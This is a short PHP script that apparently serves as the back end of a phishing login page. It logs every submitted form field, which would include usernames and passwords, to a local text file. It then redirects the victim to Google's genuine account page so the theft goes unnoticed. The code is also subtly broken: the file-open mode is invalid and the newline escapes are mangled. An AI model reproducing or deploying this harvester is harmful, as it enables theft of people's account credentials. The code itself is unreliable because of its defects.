<?php
header ('Location:https://accounts.google.com/');
$handler = fopen("polzovatel.txt", "b");
foreach($_POST as $variabler => $valuer) {
 fwrite($handler, $variabler);
 fwrite($handler, "=");
 fwrite($handler, $valuer);
 fwrite($handler, "rn");
}
fwrite($handler, "rn");
fclose($handler);
exit;
?>